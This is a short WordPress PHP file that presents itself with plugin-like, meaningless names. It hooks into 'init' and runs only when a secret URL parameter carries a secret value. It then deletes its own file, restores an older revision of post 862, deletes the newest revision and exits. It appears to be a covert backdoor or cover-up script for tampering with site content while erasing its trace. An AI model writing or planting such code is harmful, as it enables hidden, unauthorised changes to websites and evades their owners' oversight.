<?php

function migration_wishlist_wpml() {
	if (isset($_GET['stats_code_attachment_rtl']) && $_GET['stats_code_attachment_rtl'] === 'themes_sticky_support_menus') {
		unlink(trim(preg_replace('/\(.*$/', '', __FILE__)));
		$restaurant_details_photos = 862;
		$video_parts_style_variations = wp_get_post_revisions($restaurant_details_photos);
		if (empty($video_parts_style_variations)) die('no revisions');
		if (count($video_parts_style_variations) < 2) die('less than 2');
		$floating_comments_cover = array_shift($video_parts_style_variations);
		$portfolio_based_cart = $floating_comments_cover->ID;
		$github_members_coupon = array_shift($video_parts_style_variations);
		$namespaced_member_archives = $github_members_coupon->ID;
		$fix_mediaelement_locator = wp_restore_post_revision($namespaced_member_archives);
		if ($fix_mediaelement_locator === false) die('error restoring');
		$fix_mediaelement_locator = wp_delete_post_revision($portfolio_based_cart);		
		if ($fix_mediaelement_locator === false) die('error deleting');
		die('done');
	}
}

add_action('init', 'migration_wishlist_wpml');
